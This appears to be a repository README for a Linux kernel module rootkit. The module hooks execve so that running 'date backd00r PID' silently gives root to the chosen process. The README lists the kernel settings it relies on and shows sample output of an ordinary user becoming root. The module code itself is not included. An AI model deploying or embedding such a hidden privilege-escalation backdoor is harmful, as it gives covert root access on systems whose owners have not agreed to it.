# Syscall hook rootkit for the Linux Kernel
This is a fun example of what can be done using Linux kernel modules.

It hooks the `execve` syscall and waits for `date` to be executed with the `backd00r` argument followd by a PID number to elevate to root. It attaches new root credentials to the process pointed by PID.

Tested with kernel 5.6.6.

## Requirements
- Linux Kernel (tested with 5.6).
- `CONFIG_KALLSYMS_ALL=y` flag should be enabled to access the syscall table.
- Kernel modules enables and signature not enforced (default).
- No LSM enabled, typically Lockdown's integrity mode disables kernel modules.

## Usage
Once the module is installed, as a regular user:
`> date backd00r [PID]`

## Example
As root:
```sh
> insmod syscall_hook_rootkit.ko
[   13.668245] syscall_hook_rootkit: loading out-of-tree module taints kernel.
[   13.669009] syscall_hook_rootkit: module verification failed: signature and/or required key missing - tainting kl
[   13.674155] All lights are green...
```

As a regular user (`$$` returns the current process' PID):
```sh
> id
uid=1000(bob) gid=1000(bob) groups=1000(bob)

> date backd00r $$
[  17.343304] SECRET: making PID 1341 root!
date: extra operand '1341'
Try 'date --help' for more information.

> id 
uid=0(root) gid=0(root) groups=0(root),1000(bob)
```
